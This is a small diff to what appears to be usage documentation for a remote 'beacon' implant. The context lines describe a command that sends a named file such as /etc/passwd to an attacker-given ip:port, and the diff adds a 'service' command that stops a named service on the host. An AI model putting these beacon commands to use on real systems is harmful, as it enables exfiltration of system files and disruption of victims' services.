@@ -48,3 +48,5 @@ Beacon Commands: *Found in the beacon's file located on the server. CAUTION: Do 
 	- Next lines will be filename first, ip:port to send to second. Example:
 		/etc/passwd
 		10.10.10.10:429
+"service" - Stop service
+	- Next line will contain service name to stop
